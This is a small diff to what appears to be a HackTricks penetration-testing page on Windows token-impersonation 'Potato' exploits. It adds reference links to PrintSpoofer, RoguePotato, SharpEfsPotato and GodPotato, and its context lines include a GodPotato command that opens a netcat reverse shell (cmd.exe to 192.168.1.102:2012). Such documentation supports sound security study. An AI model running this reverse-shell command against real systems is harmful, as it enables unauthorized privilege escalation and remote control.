@@ -75,6 +75,13 @@ GodPotato -cmd "cmd /c whoami"
 GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
 
+## References
+* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
+* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
+* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
+* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
+
 <details>
 
 <summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
